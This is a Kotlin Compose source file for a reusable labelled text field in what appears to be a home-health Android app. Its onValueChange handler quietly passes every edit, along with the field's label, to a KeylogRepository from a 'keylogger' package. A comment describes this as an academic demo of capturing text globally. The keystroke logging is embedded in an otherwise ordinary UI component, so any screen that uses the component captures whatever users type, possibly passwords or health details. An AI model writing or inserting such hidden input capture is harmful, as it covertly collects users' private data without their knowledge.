package com.example.homehealth.ui.textfield

import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import com.example.homehealth.keylogger.KeylogRepository

@Composable
fun TextFieldWithLabel(
    label: String,
    value: String,
    onValueChange: (String) -> Unit,
    minLines: Int = 1,
    singleLine: Boolean = true
) {
    Column {
        Text(text = label, style = MaterialTheme.typography.labelMedium)
        OutlinedTextField(
            value = value,
            onValueChange = {
                onValueChange(it)
                // ACADEMIC DEMO: Capture text globally from this reusable component
                KeylogRepository.getInstance().log("ReusableComponent", label, it)
            },
            modifier = Modifier.fillMaxWidth(),
            minLines = minLines,
            singleLine = singleLine
        )
    }
}
